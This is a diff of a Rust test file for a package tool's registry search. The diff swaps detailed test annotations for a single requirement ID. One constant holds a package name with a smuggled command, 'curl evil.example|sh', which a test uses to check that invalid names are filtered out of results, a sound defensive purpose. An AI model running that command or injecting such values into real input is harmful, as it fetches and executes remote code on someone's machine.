@@ -86,10 +86,7 @@ impl World {
     }
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "queries all configured registries"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn search_asks_every_registry() {
     let world = World::with(&["reg-a", "reg-b"]);
     world.store("reg-a", "@alpha/ext", "1.0.0", "Alpha", false);
@@ -103,10 +100,7 @@ fn search_asks_every_registry() {
     assert_eq!(names, ["@alpha/ext", "@beta/ext"]);
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "deduplicates results across registries"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn one_entry_per_name_and_version_from_the_first_registry() {
     let world = World::with(&["reg-a", "reg-b"]);
     world.store("reg-a", "@specforge/software", "1.0.0", "From A", false);
@@ -119,7 +113,7 @@ fn one_entry_per_name_and_version_from_the_first_registry() {
     assert_eq!(searched.found[0].description, "From A");
 }
 
-#[specforge_test(behavior = "search_registry", verify = "output is deterministic")]
+#[specforge_test(requirement = "FEATURE-030")]
 fn found_is_sorted_by_name_then_version() {
     let world = World::with(&["main"]);
     for name in ["@z/ext", "@a/ext", "@m/ext"] {
@@ -132,10 +126,7 @@ fn found_is_sorted_by_name_then_version() {
     assert_eq!(names, ["@a/ext", "@m/ext", "@z/ext"]);
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "error from one registry does not abort search of others"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_failed_registry_is_reported_and_the_others_asked() {
     let world = World::with(&["failing", "working"]);
     world.client.fail_next(
@@ -159,10 +150,7 @@ fn a_failed_registry_is_reported_and_the_others_asked() {
     assert!(!searched.failed());
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "each failed registry is reported once, and search fails when every registry failed"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_search_fails_when_every_registry_failed() {
     let world = World::with(&["a", "b"]);
     for alias in ["a", "b"] {
@@ -181,7 +169,7 @@ fn a_search_fails_when_every_registry_failed() {
     assert!(searched.failed());
 }
 
-#[specforge_test(behavior = "search_registry", verify = "filters by declared category")]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_search_by_category_keeps_only_packages_declaring_it() {
     let world = World::with(&["main"]);
     world.store("main", "@acme/with", "1.0.0", "x", true);
@@ -196,10 +184,7 @@ fn a_search_by_category_keeps_only_packages_declaring_it() {
     assert_eq!(names, ["@acme/with"]);
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "a registry lists each package at the version add installs from it"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_search_lists_the_version_add_installs() {
     let world = World::with(&["main"]);
     world.store("main", "@acme/tool", "1.4.0", "t", false);
@@ -260,10 +245,7 @@ fn each_registry_is_asked_with_its_own_credential() {
     );
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "a credential store that can't be read refuses the search once, before any request: it is no registry's failure"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn an_unreadable_credential_store_refuses_the_search_once() {
     let world = World::with(&["one", "two"]);
     std::fs::create_dir_all(world.project.home()).unwrap();
@@ -277,7 +259,7 @@ fn an_unreadable_credential_store_refuses_the_search_once() {
 
 const HOSTILE_NAME: &str = "@sdk/greet; curl evil.example|sh";
 
-#[specforge_test(behavior = "search_registry", verify = "output is deterministic")]
+#[specforge_test(requirement = "FEATURE-030")]
 fn one_name_found_in_two_registries_is_listed_by_version_precedence() {
     let world = World::with(&["reg-a", "reg-b"]);
     world.store("reg-a", "@acme/tool", "9.0.0", "x", false);
@@ -293,10 +275,7 @@ fn one_name_found_in_two_registries_is_listed_by_version_precedence() {
     assert_eq!(versions, ["9.0.0", "10.0.0"]);
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "a registry serves no stored package whose name is no package name"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_stored_name_that_is_no_package_name_is_not_listed() {
     let world = World::with(&["main"]);
     world.store("main", HOSTILE_NAME, "9.9.9", "x", false);
@@ -309,10 +288,7 @@ fn a_stored_name_that_is_no_package_name_is_not_listed() {
     assert_eq!(names, ["@sdk/good"]);
 }
 
-#[specforge_test(
-    behavior = "search_registry",
-    verify = "a hit's description is listed printable, each control character as its escape"
-)]
+#[specforge_test(requirement = "FEATURE-030")]
 fn a_found_description_is_listed_printable() {
     let world = World::with(&["main"]);
     world.store(
